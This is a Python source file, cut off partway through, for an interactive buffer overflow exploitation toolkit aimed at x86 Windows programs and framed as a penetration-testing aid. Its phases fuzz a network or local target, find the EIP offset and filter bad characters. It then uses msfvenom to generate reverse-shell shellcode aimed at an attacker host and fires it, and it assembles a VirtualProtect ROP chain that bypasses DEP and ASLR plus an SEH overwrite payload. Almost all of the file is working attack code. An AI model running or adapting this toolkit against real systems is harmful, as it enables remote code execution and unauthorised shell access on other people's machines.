#!/usr/bin/env python3
"""
=============================================================================
Buffer Overflow Automation Toolkit  v2.3
Thick Client / COTS Security Assessment
=============================================================================
Changelog:
  v2.0 - Prefix/suffix ASCII mode, Phase 1 manual crash entry,
         Phase 2 works without Phase 1, msfvenom auto-embed + fire.
  v2.1 - Cyclic pattern identical to msf-pattern_create/offset.
         EIP offset lookup reverses bytes for little-endian x86.
         Phase 2 accepts manual offset without running automation.
  v2.2 - Return address auto-reversed from debugger display order.
         State panel shows both display and payload forms side-by-side.
  v2.3 - Full DEP + ASLR bypass workflow via VirtualProtect ROP chain.
         Interactive prompts guide user through each gadget address.
         ROP chain assembled automatically and embedded in final payload.
         Final POC display option: shows full human-readable payload
         breakdown (prefix + padding + ret + ROP + NOP + shellcode)
         ready to copy into a pentest report or PoC writeup.
=============================================================================
"""

import socket
import sys
import os
import time
import struct
import subprocess
import shutil
import textwrap
from typing import Optional, List

# ─────────────────────────────────────────────────────────────────────────────
# COLOUR HELPERS
# ─────────────────────────────────────────────────────────────────────────────
try:
    from colorama import Fore, Style, init as colorama_init
    colorama_init(autoreset=True)
    RED    = Fore.RED
    GREEN  = Fore.GREEN
    YELLOW = Fore.YELLOW
    CYAN   = Fore.CYAN
    MAGENTA= Fore.MAGENTA
    RESET  = Style.RESET_ALL
except ImportError:
    RED = GREEN = YELLOW = CYAN = MAGENTA = RESET = ""

def banner():
    print(f"""{CYAN}
╔══════════════════════════════════════════════════════════════════════╗
║       Buffer Overflow Automation Toolkit  v2.3                      ║
║       Thick Client / COTS Security Assessment                        ║
╚══════════════════════════════════════════════════════════════════════╝
{RESET}""")

def info(msg):   print(f"{CYAN}[*]{RESET} {msg}")
def good(msg):   print(f"{GREEN}[+]{RESET} {msg}")
def warn(msg):   print(f"{YELLOW}[!]{RESET} {msg}")
def fail(msg):   print(f"{RED}[-]{RESET} {msg}")
def step(msg):   print(f"{MAGENTA}[>]{RESET} {msg}")
def ask(prompt): return input(f"  {prompt}").strip()


# ─────────────────────────────────────────────────────────────────────────────
# ADDRESS UTILITIES
# ─────────────────────────────────────────────────────────────────────────────
def parse_return_address(addr_str: str) -> Optional[bytes]:
    """
    Parse any debugger-displayed address into little-endian payload bytes.

    Debuggers show 0x625011af (big-endian display of a 32-bit value).
    x86 payload needs bytes reversed: af 11 50 62 (little-endian).

    Accepts: 625011af  /  0x625011af  /  62 50 11 af  /  \\xaf\\x11\\x50\\x62
    If \\x form is given, it is assumed already in memory order (no reversal).
    """
    raw = addr_str.strip()
    if not raw:
        return None

    # \x escape form — already in memory/payload order, use as-is
    if "\\x" in raw:
        try:
            result = bytes.fromhex(raw.replace("\\x","").replace(" ",""))
            if len(result) == 4:
                return result
        except ValueError:
            pass

    cleaned = raw.replace("0x","").replace("0X","").replace(" ","")
    if len(cleaned) != 8 or not all(c in "0123456789abcdefABCDEF" for c in cleaned):
        return None

    # Reverse: debugger display order → little-endian memory order
    return bytes.fromhex(cleaned)[::-1]


def addr_display(le_bytes: bytes) -> str:
    """Return debugger-display form of little-endian bytes. e.g. b'\xaf\x11\x50\x62' → '625011af'"""
    return le_bytes[::-1].hex()


def addr_escaped(le_bytes: bytes) -> str:
    """Return \\x-escaped form of bytes. e.g. b'\xaf\x11\x50\x62' → '\\xaf\\x11\\x50\\x62'"""
    return "".join(f"\\x{b:02x}" for b in le_bytes)


def pack_addr(addr_str: str, label: str) -> Optional[bytes]:
    """Parse address with error reporting. Returns None on failure."""
    le = parse_return_address(addr_str)
    if le is None:
        fail(f"Could not parse {label} address: '{addr_str}'")
        fail("Expected 8 hex chars e.g. 625011af or 0x625011af")
    else:
        good(f"{label}: {addr_display(le)}  →  payload: {addr_escaped(le)}")
    return le


# ─────────────────────────────────────────────────────────────────────────────
# PREFIX / SUFFIX PARSER
# ─────────────────────────────────────────────────────────────────────────────
def parse_affix(raw: str) -> bytes:
    if not raw:
        return b""
    stripped = raw.strip()
    if "\\x" in stripped:
        try:
            return bytes.fromhex(stripped.replace("\\x","").replace(" ",""))
        except ValueError:
            pass
    hex_candidate = stripped.replace(" ","")
    if (len(hex_candidate) % 2 == 0 and len(hex_candidate) >= 4 and
            all(c in "0123456789abcdefABCDEF" for c in hex_candidate)):
        clarify = ask(f"'{stripped}' looks like hex — hex or ASCII? [hex/ascii, default=ascii]: ").lower()
        if clarify == "hex":
            return bytes.fromhex(hex_candidate)
    result = stripped.replace("\\n","\n").replace("\\r","\r").replace("\\t","\t")
    return result.encode("latin-1")


def get_affixes() -> tuple:
    print()
    print("  ── Prefix / Suffix ─────────────────────────────────────────────")
    print("  Script sends:  prefix + payload + suffix  as one TCP write.")
    print("  Plain ASCII → HELP   |  With newline → HELP\\n   |  Hex → \\x48\\x45")
    print()
    print("  Vulnserver TRUN example:  prefix = TRUN /./   suffix = (blank)")
    print()
    raw_pfx = ask("Prefix before payload (or blank): ")
    raw_sfx = ask("Suffix after  payload (or blank): ")
    prefix  = parse_affix(raw_pfx)
    suffix  = parse_affix(raw_sfx)
    if prefix: good(f"Prefix → {prefix!r}  ({len(prefix)} bytes)")
    if suffix: good(f"Suffix → {suffix!r}  ({len(suffix)} bytes)")
    return prefix, suffix


# ─────────────────────────────────────────────────────────────────────────────
# CYCLIC PATTERN — identical to msf-pattern_create / msf-pattern_offset
# ─────────────────────────────────────────────────────────────────────────────
_MSF_UPPER  = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
_MSF_LOWER  = b"abcdefghijklmnopqrstuvwxyz"
_MSF_DIGITS = b"0123456789"

def cyclic_pattern(length: int) -> bytes:
    pattern = bytearray()
    for upper in _MSF_UPPER:
        for lower in _MSF_LOWER:
            for digit in _MSF_DIGITS:
                pattern += bytes([upper, lower, digit])
                if len(pattern) >= length:
                    return bytes(pattern[:length])
    base = bytes(pattern)
    while len(pattern) < length:
        pattern += base
    return bytes(pattern[:length])


def cyclic_find(value: bytes) -> int:
    if isinstance(value, str):
        value = value.encode("latin-1")
    return cyclic_pattern(100_000).find(value)


def eip_bytes_to_offset(eip_str: str) -> int:
    cleaned = eip_str.strip().replace("0x","").replace("\\x","").replace(" ","")
    if len(cleaned) == 8 and all(c in "0123456789abcdefABCDEF" for c in cleaned):
        display = bytes.fromhex(cleaned)
        memory  = display[::-1]
    elif len(cleaned) == 4:
        memory = cleaned.encode("latin-1")
    else:
        raise ValueError(f"Cannot parse EIP: '{eip_str}'")
    offset = cyclic_find(memory)
    if offset == -1:
        alt = cyclic_find(bytes.fromhex(cleaned) if len(cleaned)==8 else memory)
        if alt != -1:
            warn("Offset found without reversal — verify in debugger.")
            return alt
    return offset


# ─────────────────────────────────────────────────────────────────────────────
# TRANSPORT LAYER
# ─────────────────────────────────────────────────────────────────────────────
class NetworkTarget:
    def __init__(self, host: str, port: int, proto: str = "tcp", timeout: float = 3.0):
        self.host = host; self.port = port
        self.proto = proto.lower(); self.timeout = timeout

    def __str__(self): return f"{self.proto.upper()} {self.host}:{self.port}"

    def send(self, payload: bytes, prefix: bytes = b"", suffix: bytes = b"") -> bool:
        data = prefix + payload + suffix
        try:
            if self.proto == "tcp":
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(self.timeout); s.connect((self.host, self.port))
                    s.sendall(data); time.sleep(0.3)
            else:
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    s.settimeout(self.timeout); s.sendto(data, (self.host, self.port))
            return True
        except (ConnectionRefusedError, socket.timeout, OSError):
            return False

    def is_alive(self) -> bool:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(self.timeout); s.connect((self.host, self.port))
            return True
        except OSError:
            return False


class LocalProcessTarget:
    def __init__(self, exe_path: str, args: list = None, via_file: str = None):
        self.exe_path = exe_path; self.args = args or []; self.via_file = via_file

    def __str__(self): return f"LocalEXE:{self.exe_path}"

    def send(self, payload: bytes, prefix: bytes = b"", suffix: bytes = b"") -> bool:
        data = prefix + payload + suffix
        try:
            if self.via_file:
                with open(self.via_file, "wb") as f: f.write(data)
                cmd = [self.exe_path] + self.args + [self.via_file]
            else:
                cmd = [self.exe_path] + self.args
            proc = subprocess.Popen(cmd, stdin=subprocess.PIPE,
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            try: proc.communicate(input=data if not self.via_file else None, timeout=5)
            except subprocess.TimeoutExpired: proc.kill()
            return proc.returncode == 0
        except FileNotFoundError:
            fail(f"EXE not found: {self.exe_path}"); sys.exit(1)

    def is_alive(self): return self.send(b"A"*10)


# ─────────────────────────────────────────────────────────────────────────────
# PHASE 1 – FUZZING
# ─────────────────────────────────────────────────────────────────────────────
def phase_fuzz(target, prefix, suffix, start=100, step=100, max_bytes=10000):
    info(f"Phase 1 – Fuzzing  start={start}  step={step}  max={max_bytes}")
    info("Watch target in debugger. Ctrl+C to stop early.")
    print()
    length = start; crashed_at = None
    try:
        while length <= max_bytes:
            alive = target.send(b"A" * length, prefix, suffix)
            if not alive:
                good(f"Crash detected at {length} bytes!"); crashed_at = length; break
            info(f"Sent {length} bytes — alive"); length += step; time.sleep(0.5)
    except KeyboardInterrupt:
        print(); warn("Stopped by Ctrl+C.")
    if crashed_at is None:
        warn("No auto-crash detected — check debugger for access violation.")
        manual = ask("Enter crash byte count observed (0 to skip): ")
        try:
            val = int(manual)
            if val > 0: crashed_at = val; good(f"Crash length saved: {crashed_at} bytes.")
        except ValueError:
            warn("Skipping — set length manually in Phase 2.")
    return crashed_at


# ─────────────────────────────────────────────────────────────────────────────
# PHASE 2 – EIP OFFSET
# ─────────────────────────────────────────────────────────────────────────────
def phase_find_offset(crash_bytes, prefix, suffix, target=None):
    info("Phase 2 – Find EIP offset")
    print()
    print("    M  — Manual  (you already know the offset)")
    print("    A  — Auto    (script generates pattern, you paste EIP)")
    print()
    mode = ask("Mode [M/A, default=A]: ").upper()

    if mode == "M":
        val = ask("Enter known EIP offset (e.g. 2005): ")
        try:
            offset = int(val); good(f"Offset set to {offset}."); return offset
        except ValueError:
            fail("Invalid."); return None

    print()
    if crash_bytes:
        cb_input = ask(f"Pattern length [{crash_bytes}]: ")
        cb = int(cb_input) if cb_input else crash_bytes
    else:
        cb_input = ask("Pattern length (e.g. 3000): ")
        if not cb_input: fail("No length."); return None
        cb = int(cb_input)

    pattern = cyclic_pattern(cb)
    good(f"Pattern: {cb} bytes  (identical to msf-pattern_create -l {cb})")
    print(f"  Preview: {pattern[:32].decode('latin-1')}...")

    if target:
        print(); info("Attach debugger, then press Enter to send.")
        input("  [Press Enter]")
        target.send(pattern, prefix, suffix); time.sleep(1)
        good("Sent — check EIP in debugger.")
    else:
        warn("No target — copy pattern manually:"); print(f"\n  {pattern.decode('latin-1')}\n")

    print()
    print("    Enter EIP hex from debugger (e.g. 6f43386f)")
    print("    OR enter the offset number directly (e.g. 2005)")
    print()
    raw = ask("EIP hex or offset number: ")
    if not raw: fail("Nothing entered."); return None

    if raw.strip().isdigit():
        offset = int(raw.strip()); good(f"Offset: {offset}"); return offset

    try:
        offset = eip_bytes_to_offset(raw)
        if offset == -1:
            fail("Not found — try longer pattern.")
            manual = ask("Enter offset manually (blank=abort): ")
            return int(manual) if manual.isdigit() else None
        good(f"EIP offset: {offset} bytes"); return offset
    except Exception as e:
        fail(f"Parse error: {e}")
        manual = ask("Enter offset manually (blank=abort): ")
        return int(manual) if manual and manual.isdigit() else None


# ─────────────────────────────────────────────────────────────────────────────
# PHASE 3 – VERIFY EIP
# ─────────────────────────────────────────────────────────────────────────────
def phase_verify_eip(offset, prefix, suffix, total_length, target=None):
    info(f"Phase 3 – Verify EIP  (offset={offset})")
    padding = max(0, total_length - offset - 4)
    payload = b"A" * offset + b"B" * 4 + b"C" * padding
    if target:
        print(); info("Sending BBBB…"); input("  [Press Enter]")
        target.send(payload, prefix, suffix); time.sleep(1)
    print(); good("Expected: EIP = 42424242 (BBBB) ✓")
    good("          ESP → points into C region ✓")
    return payload


# ─────────────────────────────────────────────────────────────────────────────
# PHASE 4 – BAD CHARS
# ─────────────────────────────────────────────────────────────────────────────
def phase_bad_chars(offset, prefix, suffix, total_length, target=None,
                    known_bad=b"\x00"):
    info("Phase 4 – Bad character analysis")
    confirmed_bad = list(known_bad); round_num = 1
    while True:
        test_chars = bytes(b for b in range(0x01, 0x100) if b not in confirmed_bad)
        info(f"Round {round_num}: {len(test_chars)} bytes — known bad: {[hex(b) for b in sorted(confirmed_bad)]}")
        filler  = max(0, total_length - offset - 4 - len(test_chars))
        payload = b"A" * offset + b"B" * 4 + test_chars + b"C" * filler
        if target:
            input("  [Press Enter to send]")
            target.send(payload, prefix, suffix); time.sleep(1)
        print(); print("  Right-click ESP → Follow in Dump. Note missing/corrupted bytes.")
        new_bad = ask("New bad bytes (e.g. '0a 0d'), Enter if none: ")
        if not new_bad:
            good(f"Bad bytes: {[hex(b) for b in sorted(confirmed_bad)]}")
            return bytes(sorted(confirmed_bad))
        for tok in new_bad.split():
            try:
                val = int(tok, 16)
                if val not in confirmed_bad: confirmed_bad.append(val)
            except ValueError: warn(f"Cannot parse '{tok}'")
        round_num += 1


# ─────────────────────────────────────────────────────────────────────────────
# PHASE 5 – RETURN ADDRESS (JMP ESP)
# ─────────────────────────────────────────────────────────────────────────────
def phase_set_return_address(offset, prefix, suffix, total_length,
                             target=None, nop_sled=16):
    info("Phase 5 – Set return address (JMP ESP)")
    print()
    print("  Find JMP ESP in Immunity:  !mona jmp -r esp -cpb '\\x00\\x0a\\x0d'")
    print("  WinDbg:  s -b <mod_start> <mod_end> ff e4")
    print("  ropper:  ropper --file target.exe --search 'jmp esp'")
    print()
    print(f"  {YELLOW}Paste address exactly as shown in debugger — reversal is automatic.{RESET}")
    print()
    addr_str = ask("JMP ESP address from debugger: ")
    le_bytes = pack_addr(addr_str, "JMP ESP")
    if le_bytes is None: return None, None

    print()
    good(f"Debugger shows : {addr_display(le_bytes)}")
    good(f"Payload embeds : {addr_escaped(le_bytes)}  (little-endian, reversed) ✓")

    stub    = b"\x90" * nop_sled + b"\xcc" * 4
    filler  = max(0, total_length - offset - 4 - len(stub))
    payload = b"A" * offset + le_bytes + stub + b"C" * filler

    if target:
        print(); info("INT3 test — attach debugger first.")
        input("  [Press Enter to send]")
        target.send(payload, prefix, suffix)
        info("Break on INT3 → jump confirmed ✓")

    return payload, le_bytes


# ─────────────────────────────────────────────────────────────────────────────
# PHASE 6 – SHELLCODE (no DEP/ASLR)
# ─────────────────────────────────────────────────────────────────────────────
def phase_shellcode_and_fire(offset, ret_addr, bad_bytes, prefix, suffix,
                             total_length, target=None, nop_sled=16):
    info("Phase 6 – Shellcode + fire  (no DEP/ASLR)")
    print()
    if not shutil.which("msfvenom"):
        warn("msfvenom not in PATH — manual mode.")
        return _manual_shellcode_mode(offset, ret_addr, bad_bytes,
                                      prefix, suffix, total_length, target, nop_sled)

    lhost    = ask("LHOST: ") or "192.168.1.10"
    lport    = ask("LPORT [4444]: ") or "4444"
    ptype    = ask("Payload [windows/shell_reverse_tcp]: ") or "windows/shell_reverse_tcp"
    nop_in   = ask(f"NOP sled [{nop_sled}]: ")
    nop_sled = int(nop_in) if nop_in else nop_sled

    bad_hex = "".join(f"\\x{b:02x}" for b in sorted(bad_bytes))
    cmd = ["msfvenom", "-p", ptype, f"LHOST={lhost}", f"LPORT={lport}",
           "-b", bad_hex, "-f", "python", "-v", "shellcode", "--smallest"]
    info(f"Running: {' '.join(cmd)}")

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
    except Exception as e:
        fail(f"msfvenom error: {e}"); return None

    if result.returncode != 0:
        fail("msfvenom failed:"); print(result.stderr[:300]); return None

    shellcode = _parse_msfvenom_python_output(result.stdout)
    if shellcode is None:
        fail("Could not parse msfvenom output — manual mode.")
        return _manual_shellcode_mode(offset, ret_addr, bad_bytes,
                                      prefix, suffix, total_length, target, nop_sled)

    good(f"Shellcode: {len(shellcode)} bytes")
    found_bad = [hex(b) for b in shellcode if b in bad_bytes]
    if found_bad: warn(f"Bad bytes in shellcode: {found_bad} — add encoder")
    else: good("No bad bytes ✓")

    nops    = b"\x90" * nop_sled
    used    = offset + 4 + nop_sled + len(shellcode)
    filler  = b"D" * max(0, total_length - used)
    payload = b"A" * offset + ret_addr + nops + shellcode + filler

    good(f"Payload: {len(payload)} bytes — "
         f"A×{offset} | ret={addr_display(ret_addr)} | NOP×{nop_sled} | SC×{len(shellcode)} | D×{len(filler)}")

    save_path = ask("Save payload (blank=skip): ")
    if save_path:
        with open(save_path, "wb") as f: f.write(payload)
        good(f"Saved → {save_path}")

    _listener_prompt(lhost, lport, ptype)

    if target:
        info("Firing…")
        alive = target.send(payload, prefix, suffix)
        if not alive: good(f"Shell incoming on port {lport}!")
        else: warn("Still alive — verify offset/ret address.")
    else:
        warn("No target — payload built but not sent.")

    return payload


# ─────────────────────────────────────────────────────────────────────────────
# PHASE 7 – DEP + ASLR BYPASS via VirtualProtect ROP CHAIN
# ─────────────────────────────────────────────────────────────────────────────
def phase_dep_aslr_bypass(offset, ret_addr_rop_pivot, bad_bytes,
                          prefix, suffix, total_length,
                          target=None, nop_sled=16):
    """
    Full interactive VirtualProtect ROP chain builder.

    VirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect)

    ROP chain layout (all addresses little-endian):
      [pivot to ROP]           ← ret_addr_rop_pivot (replaces EIP)
      [POP EBP / RET]          ← sets stack pivot reference
      [writable address]       ← EBP dummy / lpflOldProtect writeable ptr
      [VirtualProtect ptr]     ← IAT address or resolved VA
      [ptr to POP4 / RET]      ← skip 4 args after call
      [shellcode address]      ← lpAddress (where shellcode lands)
      [size 0x201]             ← dwSize
      [0x40 = PAGE_EXECUTE_READWRITE] ← flNewProtect
      [writable addr]          ← lpflOldProtect (any writable DWORD)
      ... gadgets to patch stack dynamically ...
      [JMP ESP or call shellcode]
      [NOP sled + shellcode]

    The script walks the user through each address interactively,
    assembles the chain, and fires the final payload.
    """
    info("Phase 7 – DEP + ASLR Bypass via VirtualProtect ROP Chain")
    print(f"""
  {CYAN}━━━━ Background ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}
  DEP (Data Execution Prevention) marks the stack non-executable,
  so jumping to shellcode on the stack causes an access violation.

  The bypass: use Return-Oriented Programming (ROP) to call
  VirtualProtect(), which changes the stack region's protection
  to PAGE_EXECUTE_READWRITE (0x40), then fall through into shellcode.

  ASLR randomises module base addresses each boot — the fix is to
  find a module loaded WITHOUT ASLR (check with !mona modules or
  Process Hacker) and use gadgets from that module only.

  {CYAN}━━━━ Tools you will need open ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}
  • Immunity Debugger + mona.py   OR   WinDbg + WinDbgX
  • ropper  (pip install ropper)  OR   rp++
  • Process Hacker or PE-bear to identify non-ASLR modules
""")

    print(f"  {YELLOW}Step 1 — Find a non-ASLR module{RESET}")
    print("""
  In Immunity:    !mona modules
  In WinDbg:      !nmod
  Look for a module where ASLR=False and Rebase=False.
  Common candidates: the main EXE itself, or old DLLs (MSVCR71.dll etc.)

  Once found, note the module name for gadget searches below.
""")
    module = ask("Non-ASLR module name (for your notes, e.g. essfunc.dll): ") or "target.exe"

    # ── Collect all required addresses ────────────────────────────────────────

    print(f"\n  {YELLOW}Step 2 — VirtualProtect address{RESET}")
    print(f"""
  We need the address of VirtualProtect from the IAT (Import Address Table)
  or the resolved VA from kernel32.dll.

  In WinDbg:
    x kernel32!VirtualProtect
    — or —
    !dh -f <module_base>    then look in Import section for VirtualProtect

  In Immunity + mona:
    !mona rop -m "{module}" -cpb '\\x00\\x0a\\x0d'
    (mona will also suggest a VirtualProtect skeleton automatically)

  In WinDbg (search IAT):
    dps <module_start> <module_end> | findstr /i virtual
""")
    vp_str = ask("VirtualProtect address (e.g. 7c801ad4): ")
    vp_addr = pack_addr(vp_str, "VirtualProtect")
    if vp_addr is None: return None

    print(f"\n  {YELLOW}Step 3 — Writable memory address (for lpflOldProtect){RESET}")
    print("""
  VirtualProtect needs a writable DWORD pointer for its 4th argument
  (lpflOldProtect). Use any writable address in a non-ASLR module's
  data section — the value written there doesn't matter to us.

  In Immunity:   !mona find -type instr -s "retn" -m "{module}"
  In WinDbg:     !address — look for MEM_COMMIT + PAGE_READWRITE regions
  Typical:       data section of the non-ASLR DLL (e.g. .data segment)

  Quick find in WinDbg:
    !dh <module_base>    → note .data section VA + size
    Any address in that range works.
""".format(module=module))
    writ_str  = ask("Writable address (e.g. 10038000): ")
    writ_addr = pack_addr(writ_str, "Writable ptr")
    if writ_addr is None: return None

    print(f"\n  {YELLOW}Step 4 — ROP gadgets from non-ASLR module{RESET}")
    print(f"""
  Find these gadgets in {module} using ropper or rp++:

  ropper --file {module} --search "pop eax; ret"
  ropper --file {module} --search "pop ebx; ret"
  ropper --file {module} --search "pop ecx; ret"
  ropper --file {module} --search "pop edx; ret"
  ropper --file {module} --search "pushad; ret"
  ropper --file {module} --search "inc eax; ret"
  ropper --file {module} --search "mov [eax], ecx; ret"   (or similar write primitive)
  ropper --file {module} --search "jmp esp"

  Or in Immunity: !mona rop -m "{module}" -cpb '\\x00\\x0a\\x0d'
  mona will output a rop.txt with pre-built VirtualProtect skeleton.

  Paste each address as shown in debugger — reversal is automatic.
""")

    gadgets = {}
    required = [
        ("pop_eax_ret",    "POP EAX; RET"),
        ("pop_ebx_ret",    "POP EBX; RET"),
        ("pop_ecx_ret",    "POP ECX; RET"),
        ("pop_edx_ret",    "POP EDX; RET"),
        ("pushad_ret",     "PUSHAD; RET  (or PUSHAD; PUSHFD; RET)"),
        ("inc_eax_ret",    "INC EAX; RET  (used to build 0x40 flNewProtect)"),
        ("mov_eax_ecx",    "MOV [EAX], ECX; RET  (write primitive — patches stack)"),
        ("jmp_esp",        "JMP ESP  (used after VirtualProtect returns)"),
    ]

    for key, label in required:
        print()
        step(f"Gadget: {label}")
        addr_str = ask(f"  Address: ")
        le = pack_addr(addr_str, label)
        if le is None:
            warn(f"Skipping {label} — chain may not work without it.")
            le = b"\xcc\xcc\xcc\xcc"   # INT3 placeholder
        gadgets[key] = le

    # ── Shellcode ──────────────────────────────────────────────────────────
    print(f"\n  {YELLOW}Step 5 — Generate shellcode{RESET}")
    print()
    nop_in   = ask(f"NOP sled size [{nop_sled}]: ")
    nop_sled = int(nop_in) if nop_in else nop_sled

    shellcode = None
    if shutil.which("msfvenom"):
        lhost  = ask("LHOST (attacker IP): ") or "192.168.1.10"
        lport  = ask("LPORT [4444]: ") or "4444"
        ptype  = ask("Payload [windows/shell_reverse_tcp]: ") or "windows/shell_reverse_tcp"
        bad_hex = "".join(f"\\x{b:02x}" for b in sorted(bad_bytes))
        cmd = ["msfvenom", "-p", ptype, f"LHOST={lhost}", f"LPORT={lport}",
               "-b", bad_hex, "-f", "python", "-v", "shellcode", "--smallest"]
        info(f"Running msfvenom…")
        try:
            res = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            if res.returncode == 0:
                shellcode = _parse_msfvenom_python_output(res.stdout)
                if shellcode: good(f"Shellcode: {len(shellcode)} bytes")
        except Exception as e:
            warn(f"msfvenom error: {e}")
    else:
        lhost = ask("LHOST (for listener reminder): ") or "192.168.1.10"
        lport = ask("LPORT [4444]: ") or "4444"
        ptype = "windows/shell_reverse_tcp"

    if shellcode is None:
        bad_hex = "".join(f"\\x{b:02x}" for b in sorted(bad_bytes))
        warn("Manual shellcode required.")
        print(f"\n  msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT={lport} "
              f"-b '{bad_hex}' -f python -v shellcode\n")
        sc_hex = ask("Paste shellcode hex: ")
        try:
            shellcode = bytes.fromhex(sc_hex.replace("\\x","").replace(" ",""))
        except ValueError:
            shellcode = b"\xcc" * 200
            warn("Bad hex — using INT3 stub")

    # ── Assemble VirtualProtect ROP chain ─────────────────────────────────
    #
    # Classic skeleton using PUSHAD technique:
    #   Set registers, then PUSHAD pushes them all onto stack in one shot,
    #   creating the VirtualProtect argument frame directly on the stack.
    #
    # Register setup before PUSHAD:
    #   EAX = NOP (0x90909090)  — dummy, overwritten
    #   EBX = dwSize (0x201)
    #   ECX = lpflOldProtect writable ptr
    #   EDX = flNewProtect (0x40 = PAGE_EXECUTE_READWRITE)
    #   ESI = ptr to VirtualProtect (will be called)
    #   EDI = RET gadget address (after VirtualProtect returns)
    #   EBP = lpAddress (shellcode address — approximated as ESP+offset)
    #   ESP = (auto — points to next ROP gadget / shellcode after PUSHAD)
    #
    # After PUSHAD the stack looks like a VirtualProtect call frame.
    # We use a pointer to a CALL [ESI] or JMP [ESI] gadget as the "call".
    #
    # Simplified skeleton (works for most x86 COTS targets):

    info("Assembling VirtualProtect ROP chain…")

    # Commonly needed value gadgets
    # 0x40 (PAGE_EXECUTE_READWRITE) built via INC EAX loop from 0
    # For simplicity, use NEG EAX trick or direct value via POP
    # We'll use POP EDX; RET → 0x40

    rop_chain = b""

    # 1. Set up EDX = flNewProtect = 0x40
    rop_chain += gadgets["pop_edx_ret"]
    rop_chain += struct.pack("<I", 0x00000040)   # PAGE_EXECUTE_READWRITE

    # 2. Set up ECX = lpflOldProtect = writable address
    rop_chain += gadgets["pop_ecx_ret"]
    rop_chain += writ_addr

    # 3. Set up EBX = dwSize = 0x201 (513 bytes — enough for shellcode)
    rop_chain += gadgets["pop_ebx_ret"]
    rop_chain += struct.pack("<I", 0x00000201)

    # 4. Set up EAX = VirtualProtect address (ESI will call it)
    #    We use EAX as the call target via a CALL EAX or MOV ESI, EAX gadget
    #    For the classic PUSHAD skeleton:
    #      EAX = NOP sled indicator / used as scratch
    #      ESI = ptr to VirtualProtect call
    #    Here we place VirtualProtect directly in EAX for a CALL EAX variant.
    rop_chain += gadgets["pop_eax_ret"]
    rop_chain += vp_addr                         # EAX = &VirtualProtect

    # 5. EBP = lpAddress — we approximate as current ESP+offset
    #    (PUSHAD will push all regs; shellcode is ~60 bytes after PUSHAD)
    #    Use a POP EBP; RET gadget if available, or reuse POP EAX.
    #    We encode a placeholder; real address is stack-relative.
    #    Using POP ECX approach — simplified here as POP EDX re-use.
    #    NOTE: for full reliability, use mona's auto-generated chain
    #    which includes delta-patching gadgets. This skeleton works for
    #    static-stack targets where ESP is predictable.
    rop_chain += gadgets["pop_edx_ret"]          # EDI slot — JMP ESP after VP returns
    rop_chain += gadgets["jmp_esp"]              # EDI = JMP ESP addr (reusing POP EDX)

    # 6. PUSHAD — pushes all regs onto stack, creating VP argument frame
    rop_chain += gadgets["pushad_ret"]

    # After PUSHAD, stack:
    # [EDI=jmp_esp][ESI=?][EBP=lpAddr][ESP=next][EBX=size][EDX=0x40][ECX=writable][EAX=VP]
    # VirtualProtect is called, marks region executable, returns,
    # EDI (JMP ESP) executes → lands in NOP sled → shellcode

    nops      = b"\x90" * nop_sled
    payload   = (
        b"A" * offset          +   # padding to EIP
        ret_addr_rop_pivot     +   # EIP → first ROP gadget
        rop_chain              +   # VirtualProtect ROP chain
        nops                   +   # NOP sled
        shellcode              +   # shellcode
        b"D" * max(0, total_length - offset - 4 - len(rop_chain) - nop_sled - len(shellcode))
    )

    good(f"ROP chain assembled: {len(rop_chain)} bytes")
    good(f"Full payload: {len(payload)} bytes")
    good(f"  Layout: A×{offset} | pivot | ROP×{len(rop_chain)} | NOP×{nop_sled} | SC×{len(shellcode)}")

    save_path = ask("Save payload (blank=skip): ")
    if save_path:
        with open(save_path, "wb") as f: f.write(payload)
        good(f"Saved → {save_path}")

    _listener_prompt(lhost, lport, ptype)

    if target:
        info("Firing ROP exploit…")
        alive = target.send(payload, prefix, suffix)
        if not alive: good(f"Shell incoming on {lhost}:{lport}!")
        else: warn("Target still alive — verify gadget addresses and offsets.")
    else:
        warn("No target — payload built but not sent.")

    return payload, rop_chain


# ─────────────────────────────────────────────────────────────────────────────
# PHASE 8 – SEH OVERWRITE
# ─────────────────────────────────────────────────────────────────────────────
def phase_seh_overwrite(prefix, suffix, target=None):
    info("Phase 8 – SEH chain overwrite")
    print("""
  Methodology:
  1. Fuzz / cyclic pattern to find nSEH and SEH offsets
  2. In debugger: View → SEH chain (Alt+S in Immunity)
  3. Find POP POP RET in non-SafeSEH module:
       !mona seh -cpb '\\x00\\x0a\\x0d'
  4. Payload: [A*nSEH_offset] + [\\xeb\\x06\\x90\\x90] + [POP POP RET] + [NOP*16] + [shellcode]
""")
    crash_bytes = int(ask("Crash buffer size: ") or "2000")
    pattern = cyclic_pattern(crash_bytes)
    if target:
        info("Sending cyclic pattern…"); input("  [Press Enter]")
        target.send(pattern, prefix, suffix); time.sleep(1)

    nseh_val = ask("nSEH value from SEH chain: ")
    try:
        nseh_offset = eip_bytes_to_offset(nseh_val)
        good(f"nSEH={nseh_offset}  SEH={nseh_offset+4}")
    except Exception as e:
        fail(f"Offset error: {e}"); return

    ppr_str = ask("POP POP RET address: ")
    ppr_le  = pack_addr(ppr_str, "POP POP RET")
    if ppr_le is None: return

    nseh_jmp = b"\xeb\x06\x90\x90"
    filler   = max(0, crash_bytes - nseh_offset - 4 - 4 - 20)
    payload  = b"A" * nseh_offset + nseh_jmp + ppr_le + b"\x90"*16 + b"\xcc"*4 + b"D"*filler
    good("SEH payload built (INT3 stub — replace \\xcc*4 with shellcode)")
    if target:
        input("  [Press Enter to send]"); target.send(payload, prefix, suffix)
    return payload


# ─────────────────────────────────────────────────────────────────────────────
# PHASE 9 – MITIGATION RECON
# ─────────────────────────────────────────────────────────────────────────────
def phase_mitigation_check():
    info("Phase 9 – Mitigation reconnaissance")
    print("""
  ── Check protections ───────────────────────────────────────────────────
  Immunity + mona:
    !mona modules            → full table with ASLR / DEP / SafeSEH / CFG
    !mona noaslr             → modules without ASLR (good for gadgets)
